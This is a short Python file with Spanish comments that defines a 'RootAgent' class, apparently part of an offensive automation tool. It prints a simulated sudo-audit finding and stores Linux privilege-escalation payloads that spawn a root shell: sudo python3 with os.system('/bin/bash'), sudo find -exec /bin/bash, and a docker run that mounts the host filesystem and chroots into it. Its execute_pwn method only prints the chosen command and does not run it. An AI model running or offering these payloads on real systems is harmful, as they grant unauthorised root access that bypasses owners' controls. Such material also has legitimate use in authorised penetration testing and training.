import os

class RootAgent: # <--- Verifica que este nombre sea exacto
    def __init__(self):
        self.name = "Root Specialist"

    def check_sudo_rights(self):
        print("[*] Root Agent: Auditando privilegios de sudo...")
        # Simula el hallazgo basado en AlterEgo y Prompted 
        print("[!] Hallazgo: NOPASSWD detectado para /usr/bin/python3")

    def get_privesc_payload(self, vector):
        # Payloads de escalada extraídos de tus casos de éxito 
        payloads = {
            "python3": "sudo python3 -c \"import os; os.system('/bin/bash')\"",
            "find": r"sudo find . -exec /bin/bash \; -quit",
            "docker": "docker run -v /:/mnt/host -it alpine chroot /mnt/host /bin/bash"
        }
        return payloads.get(vector, "Vector no definido.")

    def execute_pwn(self, vector):
        print(f"[*] Ejecutando escalada vía {vector}...")
        payload = self.get_privesc_payload(vector)
        print(f"[>>>] Comando: {payload}")
